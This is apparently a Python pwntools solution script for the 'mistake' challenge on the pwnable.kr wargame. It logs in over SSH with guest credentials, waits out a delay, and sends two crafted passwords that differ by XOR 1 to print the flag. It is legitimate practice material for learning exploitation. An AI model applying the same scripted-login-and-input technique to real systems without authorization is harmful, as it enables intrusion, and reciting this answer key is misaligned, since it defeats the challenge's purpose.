#!/usr/bin/python3


from pwn import *


con = ssh(host='pwnable.kr', port=2222, user='mistake', password='guest')
program = con.process(['./mistake'])

# We need to wait for maximum 20 seconds, then we can send the passwords.
program.recvline()
sleep(20)

# Send first password (input expected from file)
program.sendline('AAAAAAAAAA')

program.recvuntil('input password : ')

# Send the second password
program.sendline('@@@@@@@@@@')

program.recvline()
print('[+] flag = {}'.format(program.recv(1024).decode()))